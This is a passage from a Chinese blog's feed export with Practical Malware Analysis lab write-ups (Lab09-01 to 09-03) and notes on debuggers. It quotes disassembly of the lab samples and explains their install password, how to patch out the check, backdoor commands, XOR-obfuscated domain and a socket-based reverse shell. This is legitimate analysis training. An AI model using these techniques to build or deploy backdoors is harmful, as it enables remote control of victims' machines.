; CODE XREF: sub_402510+6A↑j<br>.text:00402580                 mov     al, [ebp+var_4]<br>.text:00402583                 add     al, 1<br>.text:00402585                 mov     [ebp+var_4], al<br>.text:00402588                 movsx   ecx, [ebp+var_4]<br>.text:0040258C                 mov     edx, [ebp+arg_0]<br>.text:0040258F                 movsx   eax, byte ptr [edx+3]<br>.text:00402593                 cmp     ecx, eax<br>.text:00402595                 jz      short loc_40259B<br>.text:00402597                 xor     eax, eax<br>.text:00402599                 jmp     short loc_4025A0<br>.text:0040259B ; ---------------------------------------------------------------------------<br>.text:0040259B<br>.text:0040259B loc_40259B:                             ; CODE XREF: sub_402510+85↑j<br>.text:0040259B                 mov     eax, 1<br>.text:004025A0<br>.text:004025A0 loc_4025A0:                             ; CODE XREF: sub_402510+1B↑j<br>.text:004025A0                                         ; sub_402510+30↑j ...<br>.text:004025A0                 pop     edi<br>.text:004025A1                 mov     esp, ebp<br>.text:004025A3                 pop     ebp<br>.text:004025A4                 retn<br></code></pre></td></tr></table></figure><p>为了注释以上代码，下面是我在OD中对这些代码分析的过程中的注释截图：</p><p><img src="https://i.loli.net/2019/03/15/5c8b9ed40d538.png"></p><p><img src="https://i.loli.net/2019/03/15/5c8b9f2e83ce7.png"></p><p>以上代码算是一个简单的硬编码的加密，绕了个大圈子实际上就是看参数是否为<code>abcd</code></p><p>因此此程序可以通过附加参数<code>-in abcd</code>来进行安装。</p><p><strong>2.这个代码的命令行选项是什么？它要求的密码是什么？</strong></p><p>命令行选项：</p><table><thead><tr><th>命令行选项</th><th>作用</th></tr></thead><tbody><tr><td>-in</td><td>安装服务</td></tr><tr><td>-re</td><td>卸载服务</td></tr><tr><td>-c</td><td>更新恶意代码配置</td></tr><tr><td>-cc</td><td>在控制台打印当前配置</td></tr></tbody></table><p>密码是<code>abcd</code></p><p><strong>3.如何使用OllyDbg永久修补这个恶意代码，使其不需要制定的命令行密码？</strong></p><p>只需将密码对比函数的返回值修改为1即可。</p><p><strong>4.这个恶意代码基于系统的特征是什么？</strong></p><p>程序创建了一个注册表。创建了一个服务<code>%SYSTEMROOT%\system32\文件名</code>：</p><p><img src="https://i.loli.net/2019/03/17/5c8dac11a8411.png"></p><p>程序会将自身拷贝到<code>C:\Winodows\System32\</code></p><p><img src="https://i.loli.net/2019/03/17/5c8dacb81a879.png"></p><p>创建注册表项<code>HKLM\SOFTWARE\Microsoft \XPS\Configuration</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00401009                 push    eax             ; phkResult<br>.text:0040100A                 push    0F003Fh         ; samDesired<br>.text:0040100F                 push    0               ; ulOptions<br>.text:00401011                 push    offset SubKey   ; &quot;SOFTWARE\\Microsoft \\XPS&quot;<br>.text:00401016                 push    80000002h       ; hKey<br>.text:0040101B                 call    ds:RegOpenKeyExA<br>.text:00401021                 test    eax, eax<br>.text:00401023                 jz      short loc_401029<br>.text:00401025                 xor     eax, eax<br>.text:00401027                 jmp     short loc_401066<br>.text:00401029                 push    0               ; lpcbData<br>.text:0040102B                 push    0               ; lpData<br>.text:0040102D                 push    0               ; lpType<br>.text:0040102F                 push    0               ; lpReserved<br>.text:00401031                 push    offset ValueName ; &quot;Configuration&quot;<br>.text:00401036                 mov     ecx, [ebp+phkResult]<br>.text:00401039                 push    ecx             ; hKey<br>.text:0040103A                 call    ds:RegQueryValueExA<br></code></pre></td></tr></table></figure><p><strong>5.这个恶意代码通过网络命令执行了哪些不同的操作？</strong></p><p>在IDA中看到了如下类似于命令的字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:0040C098 aNothing        db &#x27;NOTHING&#x27;,0          ; DATA XREF: sub_402020:loc_402330↑o<br>.data:0040C098                                         ; sub_402020+322↑o<br>.data:0040C0A0 ; char aRb[]<br>.data:0040C0A0 aRb             db &#x27;rb&#x27;,0               ; DATA XREF: sub_402020+2A1↑o<br>.data:0040C0A3                 align 4<br>.data:0040C0A4 ; char asc_40C0A4[2]<br>.data:0040C0A4 asc_40C0A4      db &#x27;`&#x27;,0                ; DATA XREF: sub_402020+28C↑o<br>.data:0040C0A6                 align 4<br>.data:0040C0A8 ; char aCmd_0[4]<br>.data:0040C0A8 aCmd_0          db &#x27;CMD&#x27;,0              ; DATA XREF: sub_402020:loc_40223A↑o<br>.data:0040C0A8                                         ; sub_402020+22C↑o<br>.data:0040C0AC ; char aDownload[]<br>.data:0040C0AC aDownload       db &#x27;DOWNLOAD&#x27;,0         ; DATA XREF: sub_402020:loc_402186↑o<br>.data:0040C0AC                                         ; sub_402020+178↑o<br>.data:0040C0B5                 align 4<br>.data:0040C0B8 ; char aUpload[]<br>.data:0040C0B8 aUpload         db &#x27;UPLOAD&#x27;,0           ; DATA XREF: sub_402020:loc_4020D2↑o<br>.data:0040C0B8                                         ; sub_402020+C4↑o<br>.data:0040C0BF                 align 10h<br>.data:0040C0C0 ; char asc_40C0C0[]<br>.data:0040C0C0 asc_40C0C0      db &#x27; &#x27;,0                ; DATA XREF: sub_402020+56↑o<br>.data:0040C0C0                                         ; sub_402020+70↑o ...<br>.data:0040C0C2                 align 4<br>.data:0040C0C4 ; char aSleep[]<br>.data:0040C0C4 aSleep          db &#x27;SLEEP&#x27;,0            ; DATA XREF: sub_402020:loc_40204C↑o<br>.data:0040C0C4                                         ; sub_402020+3E↑o<br></code></pre></td></tr></table></figure><p>通过查看这些字符串的引用位置，可以得出如下结论：</p><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>NOTHING</td><td>字符串比对完成后不执行任何操作</td></tr><tr><td>DOWNLOAD</td><td>读取本地文件并发送到远程主机</td></tr><tr><td>UPLOAD</td><td>c从一个网络位置下载文件到本地</td></tr><tr><td>CMD</td><td>通过进程API和网络API打开一个远程的shell</td></tr><tr><td>SLEEP</td><td>休眠</td></tr></tbody></table><p><strong>6.这个恶意代码是否有网络特征？</strong></p><p>恶意代码向<code>http://www.practicalmalwareanalysis.com</code>发出一个<code>http</code>的请求</p><p><img src="https://i.loli.net/2019/03/17/5c8dade95f964.png"></p><h3 id="Lab9-2"><a href="#Lab9-2" class="headerlink" title="Lab9-2"></a>Lab9-2</h3><p><strong>用OllyDbg分析恶意代码文件Lab09-02.exe，回答下列问题。</strong></p><p><strong>问题</strong></p><p><strong>1.在二进制文件中，你看到的静态字符串是什么？</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs dns">.rdata:<span class="hljs-number">004040</span>CC<span class="hljs-number">0000000</span>FCruntime error <br>.rdata:<span class="hljs-number">004040E0</span><span class="hljs-number">0000000</span>ECTLOSS error\r\n<br>.rdata:<span class="hljs-number">004040F0</span><span class="hljs-number">0000000</span>DCSING error\r\n<br>.rdata:<span class="hljs-number">00404100</span><span class="hljs-number">0000000</span>FCDOMAIN error\r\n<br>.rdata:<span class="hljs-number">00404110</span><span class="hljs-number">00000025</span>CR6028\r\n- unable to initialize heap\r\n<br>.rdata:<span class="hljs-number">00404138</span><span class="hljs-number">00000035</span>CR6027\r\n- not enough space for lowio initialization\r\n<br>.rdata:<span class="hljs-number">00404170</span><span class="hljs-number">00000035</span>CR6026\r\n- not enough space for stdio initialization\r\n<br>.rdata:<span class="hljs-number">004041A8</span><span class="hljs-number">00000026</span>CR6025\r\n- pure virtual function call\r\n<br>.rdata:<span class="hljs-number">004041D0</span><span class="hljs-number">00000035</span>CR6024\r\n- not enough space for _onexit/atexit table\r\n<br>.rdata:<span class="hljs-number">00404208</span><span class="hljs-number">00000029</span>CR6019\r\n- unable to open console device\r\n<br>.rdata:<span class="hljs-number">00404234</span><span class="hljs-number">00000021</span>CR6018\r\n- unexpected heap error\r\n<br>.rdata:<span class="hljs-number">00404258</span><span class="hljs-number">0000002</span>DCR6017\r\n- unexpected multithread lock error\r\n<br>.rdata:<span class="hljs-number">00404288</span><span class="hljs-number">0000002</span>CCR6016\r\n- not enough space for thread data\r\n<br>.rdata:<span class="hljs-number">004042B4</span><span class="hljs-number">00000021</span>C\r\nabnormal program termination\r\n<br>.rdata:<span class="hljs-number">004042D8</span><span class="hljs-number">0000002</span>CCR6009\r\n- not enough space for environment\r\n<br>.rdata:<span class="hljs-number">00404304</span><span class="hljs-number">0000002</span><span class="hljs-keyword">A</span>CR6008\r\n- not enough space for arguments\r\n<br>.rdata:<span class="hljs-number">00404330</span><span class="hljs-number">00000025</span>CR6002\r\n- floating point not loaded\r\n<br>.rdata:<span class="hljs-number">00404358</span><span class="hljs-number">00000025</span>CMicrosoft Visual C++ Runtime Library<br>.rdata:<span class="hljs-number">00404384</span><span class="hljs-number">0000001</span><span class="hljs-keyword">A</span>CRuntime Error!\n\nProgram: <br>.rdata:<span class="hljs-number">004043A4</span><span class="hljs-number">00000017</span>C&lt;program name unknown&gt;<br>.rdata:<span class="hljs-number">004043</span>BC<span class="hljs-number">00000013</span>CGetLastActivePopup<br>.rdata:<span class="hljs-number">004043D0</span><span class="hljs-number">00000010</span>CGetActiveWindow<br>.rdata:<span class="hljs-number">004043E0</span><span class="hljs-number">0000000</span>CCMessageBoxA<br>.rdata:<span class="hljs-number">004043</span>EC<span class="hljs-number">0000000</span>BCuser32.dll<br>.rdata:<span class="hljs-number">00404562</span><span class="hljs-number">0000000</span>DCKERNEL32.dll<br>.rdata:<span class="hljs-number">0040457</span>E<span class="hljs-number">0000000</span>BCWS2_32.dll<br></code></pre></td></tr></table></figure><p><strong>2.当你运行这个二进制文件，会发生什么？</strong></p><p>好像并没有发生什么。。。</p><p><strong>3.怎样让恶意代码的攻击负载获得运行？</strong></p><p>看到如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00401205                 push    eax             ; lpFilename<br>.text:00401206                 push    0               ; hModule<br>.text:00401208                 call    ds:GetModuleFileNameA<br>.text:0040120E                 push    5Ch             ; int<br>.text:00401210                 lea     ecx, [ebp+Filename]<br>.text:00401216                 push    ecx             ; char *<br>.text:00401217                 call    _strrchr<br>.text:0040121C                 add     esp, 8<br>.text:0040121F                 mov     [ebp+var_4], eax<br>.text:00401222                 mov     edx, [ebp+var_4]<br>.text:00401225                 add     edx, 1<br>.text:00401228                 mov     [ebp+var_4], edx<br>.text:0040122B                 mov     eax, [ebp+var_4]<br>.text:0040122E                 push    eax             ; char *<br>.text:0040122F                 lea     ecx, [ebp+var_1A0]<br>.text:00401235                 push    ecx             ; char *<br>.text:00401236                 call    _strcmp<br>.text:0040123B                 add     esp, 8<br>.text:0040123E                 test    eax, eax<br>.text:00401240                 jz      short loc_40124C<br>.text:00401242                 mov     eax, 1<br>.text:00401247                 jmp     loc_4013D6<br></code></pre></td></tr></table></figure><p>用于字符串比较的函数的两个参数一个是此程序的文件名，另一个是<code>ocl.exe</code></p><p><img src="https://i.loli.net/2019/03/17/5c8e05579ff61.png"></p><p>如果文件名不是<code>ocl.exe</code>的话程序会直接退出，因此我们需要将文件名修改为<code>ocl.exe</code>。</p><p><strong>4.在地址0x00401133处发生了什么？</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">v13 = <span class="hljs-string">&#x27;1&#x27;</span>;<br>v14 = <span class="hljs-string">&#x27;q&#x27;</span>;<br>v15 = <span class="hljs-string">&#x27;a&#x27;</span>;<br>v16 = <span class="hljs-string">&#x27;z&#x27;</span>;<br>v17 = <span class="hljs-string">&#x27;2&#x27;</span>;<br>v18 = <span class="hljs-string">&#x27;w&#x27;</span>;<br>v19 = <span class="hljs-string">&#x27;s&#x27;</span>;<br>v20 = <span class="hljs-string">&#x27;x&#x27;</span>;<br>v21 = <span class="hljs-string">&#x27;3&#x27;</span>;<br>v22 = <span class="hljs-string">&#x27;e&#x27;</span>;<br>v23 = <span class="hljs-string">&#x27;d&#x27;</span>;<br>v24 = <span class="hljs-string">&#x27;c&#x27;</span>;<br>v25 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>v26 = <span class="hljs-string">&#x27;o&#x27;</span>;<br>v27 = <span class="hljs-string">&#x27;c&#x27;</span>;<br>v28 = <span class="hljs-string">&#x27;l&#x27;</span>;<br>v29 = <span class="hljs-string">&#x27;.&#x27;</span>;<br>v30 = <span class="hljs-string">&#x27;e&#x27;</span>;<br>v31 = <span class="hljs-string">&#x27;x&#x27;</span>;<br>v32 = <span class="hljs-string">&#x27;e&#x27;</span>;<br>v33 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br></code></pre></td></tr></table></figure><p>在这个位置上可以发现两个字符串：<code>1qaz2wsx3edc</code> 、<code>ocl.exe</code>，但是IDA没有自动识别出这个字符串，因为这些字符是在栈中的。</p><p><strong>5.传递给子例程0x00401089的参数是什么？</strong></p><p><code>1qaz2wsx3edc</code>和一个位于<code>00405034</code>长度<code>21h</code>的数据缓冲区</p><p><strong>6.恶意代码使用的域名是什么？</strong>、</p><p>把断点下在加密函数的rten语句之后可以看到返回值如下：</p><p><img src="https://i.loli.net/2019/03/17/5c8e0b39e63e9.png"></p><p><code>www.practicalmalwareanalysis.com</code></p><p><strong>7.恶意代码使用什么编码函数来混淆域名？</strong></p><p>通过对<code>0x00401089</code>函数的分析，此函数将<code>1qaz2wsx3edc</code>与<code>i</code>循环取余的结果作了异或操作。</p><p><strong>8.恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？</strong></p><p>通过查看此位置函数的参数，发现最后一个参数是一个<code>SOCKET</code>对象，函数将这个<code>SOCKET</code>对象作为<code>CreateProcess</code>函数的<code>StartupInfo</code>的标准输入、标准输出和标准错误，用这个方式来实现了一个反向连接的shell。</p><h3 id="Lab9-3"><a href="#Lab9-3" class="headerlink" title="Lab9-3"></a>Lab9-3</h3><p><strong>使用OD和IDA分析此恶意代码时。这个恶意代码加载的三个自带的DLL，他们在编译时请求相同的内存加载位置，因此，在OD中对照IDA浏览这些DLL可以发现，相同的代码可能会出现在不同的内存位置。这个实验的目的是让你使用OD看代码时可以轻松和地在IDA中找到它对应的位置。</strong></p><p><strong>问题</strong></p><p><strong>1.Lab09-03.exe导入了哪些DLL？</strong></p><p>喏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">AddressOrdinalNameLibrary<br><span class="hljs-number">00405000</span>DLL1PrintDLL1<br><span class="hljs-number">00405008</span>DLL2ReturnJDLL2<br><span class="hljs-number">0040500</span>CDLL2PrintDLL2<br><span class="hljs-number">00405014</span>WriteFileKERNEL32<br><span class="hljs-number">00405018</span>LCMapStringWKERNEL32<br><span class="hljs-number">0040501</span>CCloseHandleKERNEL32<br><span class="hljs-number">00405020</span>LoadLibraryAKERNEL32<br><span class="hljs-number">00405024</span>GetProcAddressKERNEL32<br><span class="hljs-number">00405028</span>GetStringTypeAKERNEL32<br><span class="hljs-number">0040502</span>CSleepKERNEL32<br><span class="hljs-number">00405030</span>GetCommandLineAKERNEL32<br><span class="hljs-number">00405034</span>GetVersionKERNEL32<br><span class="hljs-number">00405038</span>ExitProcessKERNEL32<br><span class="hljs-number">0040503</span>CTerminateProcessKERNEL32<br><span class="hljs-number">00405040</span>GetCurrentProcessKERNEL32<br><span class="hljs-number">00405044</span>UnhandledExceptionFilterKERNEL32<br><span class="hljs-number">00405048</span>GetModuleFileNameAKERNEL32<br><span class="hljs-number">0040504</span>CFreeEnvironmentStringsAKERNEL32<br><span class="hljs-number">00405050</span>FreeEnvironmentStringsWKERNEL32<br><span class="hljs-number">00405054</span>WideCharToMultiByteKERNEL32<br><span class="hljs-number">00405058</span>GetEnvironmentStringsKERNEL32<br><span class="hljs-number">0040505</span>CGetEnvironmentStringsWKERNEL32<br><span class="hljs-number">00405060</span>SetHandleCountKERNEL32<br><span class="hljs-number">00405064</span>GetStdHandleKERNEL32<br><span class="hljs-number">00405068</span>GetFileTypeKERNEL32<br><span class="hljs-number">0040506</span>CGetStartupInfoAKERNEL32<br><span class="hljs-number">00405070</span>GetModuleHandleAKERNEL32<br><span class="hljs-number">00405074</span>GetEnvironmentVariableAKERNEL32<br><span class="hljs-number">00405078</span>GetVersionExAKERNEL32<br><span class="hljs-number">0040507</span>CHeapDestroyKERNEL32<br><span class="hljs-number">00405080</span>HeapCreateKERNEL32<br><span class="hljs-number">00405084</span>VirtualFreeKERNEL32<br><span class="hljs-number">00405088</span>HeapFreeKERNEL32<br><span class="hljs-number">0040508</span>CRtlUnwindKERNEL32<br><span class="hljs-number">00405090</span>HeapAllocKERNEL32<br><span class="hljs-number">00405094</span>GetCPInfoKERNEL32<br><span class="hljs-number">00405098</span>GetACPKERNEL32<br><span class="hljs-number">0040509</span>CGetOEMCPKERNEL32<br><span class="hljs-number">004050</span>A0VirtualAllocKERNEL32<br><span class="hljs-number">004050</span>A4HeapReAllocKERNEL32<br><span class="hljs-number">004050</span>A8MultiByteToWideCharKERNEL32<br><span class="hljs-number">004050</span>ACLCMapStringAKERNEL32<br><span class="hljs-number">004050B</span>0GetStringTypeWKERNEL32<br><span class="hljs-number">004050B</span>8NetScheduleJobAddNETAPI32<br></code></pre></td></tr></table></figure><p><strong>2.DLL1.dll、DLL2.dll、DLL3.dll要求的基地址是多少？</strong></p><p>在PE Explorer中分别查看这三个程序的额映像基地址：</p><ul><li>DLL1：10000000h</li><li>DLL2：10000000h</li><li>DLL3：10000000h</li></ul><p><strong>3.当使用OD调试Lab09-03.exe时，为DLL1.dll、DLL2.dll、DLL3.dll分配的基地址是什么？</strong></p><p><img src="https://i.loli.net/2019/03/18/5c8e7123427e3.png"></p><p>如图三个程序的基地址分别为：<code>10000000</code>、<code>00030000</code>、<code>00A50000</code>。</p><p><strong>4.当Lab09-03.exe调用DLL1.dll中的一个导入函数时，这个导入函数都做了什么？</strong></p><p><img src="https://i.loli.net/2019/03/18/5c8e7268ebb68.png"></p><p>进入此函数发现：</p><p><img src="https://i.loli.net/2019/03/18/5c8e74254e6b0.png"></p><p>通过查看<code>DLL1.10008034</code>的交叉引用发现这个值等于<code>GetCurrentProcessId()</code>的返回值。</p><p><strong>5.当Lab09-03.exe调用WriteFile函数时，它写入的函数名是什么？</strong></p><p>第一处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00401006                 call    ds:DLL1Print<br>.text:0040100C                 call    ds:DLL2Print<br>.text:00401012                 call    ds:DLL2ReturnJ<br>.text:00401018                 mov     [ebp+hFile], eax<br>.text:0040101B                 push    0               ; lpOverlapped<br>.text:0040101D                 lea     eax, [ebp+NumberOfBytesWritten]<br>.text:00401020                 push    eax             ; lpNumberOfBytesWritten<br>.text:00401021                 push    17h             ; nNumberOfBytesToWrite<br>.text:00401023                 push    offset aMalwareanalysi ; &quot;malwareanalysisbook.com&quot;<br>.text:00401028                 mov     ecx, [ebp+hFile]<br>.text:0040102B                 push    ecx             ; hFile<br>.text:0040102C                 call    ds:WriteFile<br></code></pre></td></tr></table></figure><p>可以看到程序员的参数是<code>DLL2ReturnJ</code>的返回值，因此进入<code>DLL2</code>中看到参数是一个对<code>0x1000B078</code>的访问，在OD中在此位置下一个访问断点，运行之后看到如下结果：</p><p><img src="https://i.loli.net/2019/03/18/5c8ee5da97029.png"></p><p>因此得知此文件是<code>temp.txt</code>。</p><p><strong>6.当Lab09-03.exe使用NetScheduleJobAdd函数创建一个job时，从哪里获取第二个参数的数据？</strong></p><p><img src="https://i.loli.net/2019/03/18/5c8eebba7daed.png"></p><p>在OD中看到<code>Lab09-03.exe</code>中<code>NetScheduleJobAdd</code>的第二个参数来自于DLL3的<code>00B5B0A0</code>，DLL3的基地址是<code>00B50000</code>，因此对应到DLL3中就是<code>B050</code>的位置，在DLL3中发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:10001066                 mov     dword ptr [eax], offset dword_1000B0A0<br></code></pre></td></tr></table></figure><p><strong>7.在运行或调试Lab09-03.exe时，你会看到Lab09-03.exe打印出三块神秘数据。DLL1的神秘数据、DLL2的神秘数据、DLL3的神秘数据分别是什么？</strong></p><p>DLL1：上面分析过了是当前进程的ID。</p><p>DLL2：<code>temp.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">push    offset FileName ; &quot;temp.txt&quot;<br>call    ds:CreateFileA<br>mov     dword_1000B078, eax<br></code></pre></td></tr></table></figure><p>DLL3：<code>ping www.malwareanalysisbook.com</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:10001004                 mov     [ebp+lpMultiByteStr], offset aPingWwwMalware ; &quot;ping www.malwareanalysisbook.com&quot;<br>.text:1000100B                 push    32h             ; cchWideChar<br>.text:1000100D                 push    offset WideCharStr ; lpWideCharStr<br>.text:10001012                 push    0FFFFFFFFh      ; cbMultiByte<br>.text:10001014                 mov     eax, [ebp+lpMultiByteStr]<br>.text:10001017                 push    eax             ; lpMultiByteStr<br>.text:10001018                 push    0               ; dwFlags<br>.text:1000101A                 push    0               ; CodePage<br>.text:1000101C                 call    ds:MultiByteToWideChar<br></code></pre></td></tr></table></figure><p><strong>8.如何将DLL2.dll加载到IDA Pro中，使得他与OD的加载地址匹配？</strong></p><p>选择手动加载：</p><p><img src="https://i.loli.net/2019/03/18/5c8eefff2907c.png"></p><p>在弹出的窗口中设置新的基地址即可：</p><p><img src="https://i.loli.net/2019/03/18/5c8ef037b3f2c.png"></p><h3 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h3>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>动态分析</tag>
      
      <tag>OllyDbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态调试技术</title>
    <link href="/2019/03/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"/>
    <url>/2019/03/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>本章会重点介绍两个调试器：<code>OllyDbg</code>和<code>WinDbg</code>，调试器监控程序执行的能力在恶意代码分析的过程中十分重要，调试器允许我们查看任意内存地址的内容，寄存器的内容以及每个函数参数的值。调试器也允许我们在任意时刻改变运行中的程序中的值。</p><p><strong>源代码级调试器与汇编级调试器：</strong>源代码级调试器指在代码编写期间运行的调试器，汇编级调试器也成为底层调试器，他的操作对象使源代码而不是汇编代码。</p><p><strong>内核模式与用户模式调试：</strong>在用户模式中调试器调试的程序是单个可执行程序，操作系统会将它与其他可执行程序隔离。内核模式调试一般需要两个系统，一个系统运行被调试的代码，另一个系统运行调试器，我们需要开启操作系统的内核调试功能并将两个系统连接。<code>WinDbg</code>是一个常用的内核调试器，<code>OD</code>是一个常用的用户模式调试器。</p><span id="more"></span><p><strong>单步调试：</strong>单步调试状态下，每运行一条指令，控制权就返回到调试器，单步调试可以帮助我们看到程序中的每一个细节，但是也容易使我们陷入细节而忽略大局。</p><p><strong>单步跳过和单步跳入：</strong>这两个选项可以让我们选择在即将运行到一个函数的调用过程时，我们是选择单步步入进入此程序还是单步步过跳过此程序，有时因为单步跳过可能会使程序缺少一个正确的返回值而影响调试结果。</p><p><strong>断点：</strong>断点被用来暂停程序的运行并使你查看程序的运行状态，程序在断点处暂停运行被称为中断。</p><ul><li>硬断点：利用专门的硬件寄存器来存储设置断点的位置，当运行到指定位置时就会产生中断。</li><li>软断点：调试器通过<code>0xCC</code>及<code>INT 3</code>的机器码来重写指令的首个字节来实现软断点</li><li>条件断点：当满足某些条件的时候触发断点，如对某个指令的调用或者对函数的调用。</li></ul><p><strong>异常：</strong>异常是调试器取得运行中的程序的执行权的基本方式。本质上，除了断点产生异常外，与调试无关的事件如非法内存访问、除0操作也会产生异常。</p><p><strong>首次和二次异常处理：</strong>调试器通常有两个机会来处理同一个异常，调试器第一次附加到进程时会产生一个异常，此时程序停止执行，调试器取得控制权，调试器可以选择自己处理这个异常或者将异常移交给应用程序本身的异常处理函数，但是如果应用程序没有处理异常，调试器将会获得第二次异常处理的机会，此时调试器必须处理这个异常以防止应用程序的崩溃。在调试过程中，如果碰到了二次异常说明恶意代码中可能存在BUG或者使恶意代码不想在当前环境中运行。</p><p><strong>常见异常：</strong></p><ul><li><code>INT 3</code>异常。</li><li>单步调试产生的异常，标志寄存器中的陷阱标志（trap flag）为1时，处理器每执行一条指令就会产生一个异常。</li><li>程序访问无效地址产生的异常。</li><li>一些指令只能在特权模式才能运行，如果程序尝试在非特权模式下运行则会产生异常。</li></ul><p><strong>使用调试器修改可执行文件：</strong>调试器可以通过修改控制标志、指令指针或者代码本身等方式来改变程序执行的方式。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><p>本章无课后练习</p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>动态调试</tag>
      
      <tag>动态分析技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分析恶意Windows程序</title>
    <link href="/2019/03/%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8FWindows%E7%A8%8B%E5%BA%8F/"/>
